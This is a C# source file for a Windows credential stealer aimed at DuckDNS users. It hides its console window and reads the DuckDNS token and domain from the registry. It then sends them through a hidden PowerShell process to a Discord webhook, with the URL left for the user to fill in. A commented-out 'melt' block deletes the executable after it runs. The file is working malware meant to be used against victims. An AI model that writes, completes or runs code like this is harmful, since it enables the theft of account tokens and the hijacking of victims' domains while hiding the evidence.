using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace duckdns
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static void Main(string[] args)
        {
            IntPtr handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE); //hide console
            object var1 = Registry.GetValue(@"HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\<unnamed>", "token", null);
            string stringvar1 = var1?.ToString();
            object var2 = Registry.GetValue(@"HKEY_CURRENT_USER\Software\JavaSoft\Prefs\<unnamed>", "token", null);
            string stringvar2 = var2?.ToString();
            string result = stringvar1 ?? stringvar2;
            object domain1 = Registry.GetValue(@"HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\<unnamed>", "domain", null);
            string stringdomain1 = domain1?.ToString();
            object domain2 = Registry.GetValue(@"HKEY_CURRENT_USER\Software\JavaSoft\Prefs\<unnamed>", "domain", null);
            string stringdomain2 = domain2?.ToString();
            string result2 = stringdomain1 ?? stringdomain2;
            string webook = ""; //put discord webhook here
            string script = $@"
$webhookURL = '{webook}' 
$jsonPayload = @{{content = ""TOKEN: **{result}**, DOMAIN: **{result2}**""}}
Invoke-RestMethod -Uri $webhookURL -Method POST -ContentType 'application/json' -Body ($jsonPayload | ConvertTo-Json)
Exit 0
";
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    RedirectStandardInput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            process.Start();
            process.StandardInput.WriteLine(script);
            process.WaitForExit();

            /*try (MELT) ITS NOT NECESSARY, ITS JUST A AUTO-DESTRUCT
            {
                string batch = Path.GetTempFileName() + ".bat";
                using (StreamWriter sw = new StreamWriter(batch))
                {
                    sw.WriteLine("@echo off");
                    sw.WriteLine("timeout 3 > NUL");
                    sw.WriteLine("CD " + AppDomain.CurrentDomain.BaseDirectory);
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + "\"" + " /f /q");
                    sw.WriteLine("CD " + Path.GetTempPath());
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                }

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = batch,
                    CreateNoWindow = true,
                    ErrorDialog = false,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(startInfo);
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
            */
               

        } 
    }
}

